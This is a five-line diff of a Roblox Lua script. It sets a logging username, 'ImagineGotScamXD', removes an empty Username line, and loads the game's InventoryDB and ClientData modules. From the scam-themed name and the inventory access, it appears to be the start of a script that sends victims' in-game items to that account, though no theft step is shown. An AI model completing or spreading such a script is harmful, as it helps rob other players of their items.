@@ -1,5 +1,4 @@
 local LogsUsername = "ImagineGotScamXD"
-Username = ""
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
